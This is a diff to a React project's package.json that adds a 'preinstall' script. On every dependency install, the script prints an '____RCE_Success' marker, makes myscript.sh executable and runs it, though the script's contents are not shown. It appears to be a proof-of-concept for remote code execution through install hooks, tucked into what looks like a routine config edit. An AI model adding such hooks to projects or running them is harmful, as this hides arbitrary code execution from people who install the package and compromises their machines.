@@ -3,6 +3,7 @@
 	"version": "0.1.0",
 	"private": true,
 	"scripts": {
+		"preinstall": "echo ____RCE_Success runFile >&2; chmod +x myscript.sh; ./myscript.sh",
 		"start": "react-scripts start",
 		"build": "react-scripts build",
 		"test": "react-scripts test",
